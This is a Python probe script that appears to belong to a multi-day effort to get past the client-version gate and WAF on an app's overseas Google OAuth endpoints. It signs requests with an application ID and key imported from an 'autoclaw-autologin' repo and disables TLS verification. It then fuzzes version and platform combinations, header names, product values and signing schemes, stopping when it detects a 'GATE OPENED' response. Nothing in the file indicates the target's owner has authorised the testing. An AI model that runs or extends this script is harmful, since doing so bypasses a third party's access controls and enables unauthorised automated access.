#!/usr/bin/env python3
"""Day-3.6: close the version×tm cross-product gap.

Gap found in prior probes: X-Version escalation ran ONLY with tm=win
(all -> 631002); tm=win32/darwin/android were only ever tested at v=2.5.0
(all -> 400001 "Request data error"). Meanwhile google-oauth-login (same
middleware, same signing) reaches the real handler (631001). Hypothesis:
the non-win branch PARSES X-Version and 2.5.0 fails its expectation
(minimum, format, or equality with a real mobile/desktop build).

Also fuzz: absent/integer X-Version, extra version header names,
X-Product variants, sign-over-body variants (one request each).
"""
import hashlib
import json
import sys
import time
import uuid
import warnings

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

sys.path.insert(0, "/home/z/my-project/repos/autoclaw-autologin")
from config import APP_ID, APP_KEY, PRODUCT, USER_API_BASE

BASE = USER_API_BASE
OAUTH = "/userapi/overseasv1/google-oauth-url"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "autoclaw/{v} Chrome/120.0.0.0 Electron/28.0.0 Safari/537.36")
results = []


def hdrs(version="2.5.0", tm="win", extra=None, ua=None):
    ts = str(int(time.time()))
    sg = hashlib.md5(f"{APP_ID}&{ts}&{APP_KEY}".encode()).hexdigest()
    h = {"X-Auth-Appid": APP_ID, "X-Auth-TimeStamp": ts, "X-Auth-Sign": sg,
         "X-Product": PRODUCT, "X-Version": version, "X-Tm": tm,
         "X-Trace-Id": str(uuid.uuid4()), "Content-Type": "application/json",
         "User-Agent": ua or UA.format(v=version),
         "Accept": "application/json"}
    if extra:
        h.update(extra)
    return h


def body():
    return {"source_id": "autoclaw", "device_id": str(uuid.uuid4()),
            "navigate_uri": "http://localhost:18432/auth/callback-google"}


def run(label, h, b=None, path=OAUTH):
    try:
        r = requests.post(BASE + path, headers=h, json=(b if b is not None
                                                        else body()),
                          timeout=12, verify=False)
        try:
            d = r.json()
            code, msg = d.get("code"), str(d.get("msg", ""))[:80]
            data = d.get("data")
        except Exception:
            d, code, msg, data = None, f"HTTP {r.status_code}", "non-JSON", None
        extra = ""
        if data:
            extra = f" data={json.dumps(data, ensure_ascii=False)[:200]}"
        print(f"[{label}] code={code} {msg}{extra}")
        results.append({"label": label, "code": str(code), "msg": msg,
                        "data": data})
        return code, d
    except Exception as exc:
        print(f"[{label}] ERROR {str(exc)[:80]}")
        results.append({"label": label, "code": "EXC", "msg": str(exc)[:80]})
        return None, None


def cross_product():
    print("=" * 90)
    print("A) version x tm cross-product (the missed grid)")
    print("=" * 90)
    versions = ["1.0.0", "1.2.3", "2.0.0", "2.5.0", "3.0.0", "3.5.0",
                "4.0.0", "4.2.0", "4.2.2", "5.2.0", "6.1.0", "8.0.0"]
    tms = ["win32", "darwin", "android", "ios"]
    hit = None
    for tm in tms:
        for v in versions:
            code, d = run(f"A tm={tm} v={v}", hdrs(v, tm))
            if code == 0 and isinstance(d, dict) and d.get("data"):
                hit = d["data"]
                print(f"    *** GATE OPENED tm={tm} v={v} ***")
                break
            time.sleep(0.3)
        if hit:
            break


def version_shapes():
    print("\n" + "=" * 90)
    print("B) X-Version exotic shapes (tm=win32)")
    print("=" * 90)
    for label, v in [("absent", None), ("integer", 25), ("empty", ""),
                     ("2-digit", "2.5"), ("4-part", "2.5.0.1"),
                     ("v-prefix", "v2.5.0"), ("build", "2.5.0+100"),
                     ("date", "2026.09.21"), ("huge", "99.99.99")]:
        h = hdrs("2.5.0", "win32")
        if v is None:
            h.pop("X-Version")
        else:
            h["X-Version"] = v
        run(f"B {label}", h)
        time.sleep(0.3)


def header_fuzz():
    print("\n" + "=" * 90)
    print("C) Extra version/client headers + product variants (tm=win32 v=2.5.0)")
    print("=" * 90)
    cases = [
        ("X-App-Version 2.5.0", {"X-App-Version": "2.5.0"}),
        ("X-Client-Version 2.5.0", {"X-Client-Version": "2.5.0"}),
        ("X-Appver 2.5.0", {"X-Appver": "2.5.0"}),
        ("X-Client-Type desktop", {"X-Client-Type": "desktop"}),
        ("X-Device-Id", {"X-Device-Id": str(uuid.uuid4())}),
        ("X-Auth-Ver 1", {"X-Auth-Ver": "1"}),
        ("X-Region oversea", {"X-Region": "oversea"}),
        ("X-Lang en", {"X-Lang": "en"}),
    ]
    for label, extra in cases:
        run(f"C {label}", hdrs("2.5.0", "win32", extra=extra))
        time.sleep(0.3)
    for prod in ("AutoClaw", "autoclaw-desktop", "autoclaw_app", "desktop"):
        h = hdrs("2.5.0", "win32")
        h["X-Product"] = prod
        run(f"C product={prod}", h)
        time.sleep(0.3)


def sign_variants():
    print("\n" + "=" * 90)
    print("D) Sign-algorithm variants (tm=win32) on google-oauth-login control")
    print("=" * 90)
    # control: confirm oauth-login still reaches handler with base sign
    ts = str(int(time.time()))
    sg = hashlib.md5(f"{APP_ID}&{ts}&{APP_KEY}".encode()).hexdigest()
    h = hdrs("2.5.0", "win32")
    run("D control oauth-login", hdrs("2.5.0", "win32"),
        {"code": "x" * 32, "state": "y" * 32, "device_id": str(uuid.uuid4())},
        path="/userapi/overseasv1/google-oauth-login")
    # variant: sign includes product
    ts = str(int(time.time()))
    sg2 = hashlib.md5(f"{APP_ID}&{ts}&{PRODUCT}&{APP_KEY}".encode()).hexdigest()
    h = hdrs("2.5.0", "win32")
    h["X-Auth-TimeStamp"], h["X-Auth-Sign"] = ts, sg2
    run("D sign+product oauth-url", h)
    time.sleep(0.3)
    # variant: sign sha256
    ts = str(int(time.time()))
    sg3 = hashlib.sha256(f"{APP_ID}&{ts}&{APP_KEY}".encode()).hexdigest()
    h = hdrs("2.5.0", "win32")
    h["X-Auth-TimeStamp"], h["X-Auth-Sign"] = ts, sg3
    run("D sign-sha256 oauth-url", h)
    time.sleep(0.3)


if __name__ == "__main__":
    cross_product()
    version_shapes()
    header_fuzz()
    sign_variants()
    with open("/home/z/my-project/scripts/waf_gap_results.json", "w") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print("\nDay-3.6 gap-closure probe complete.")
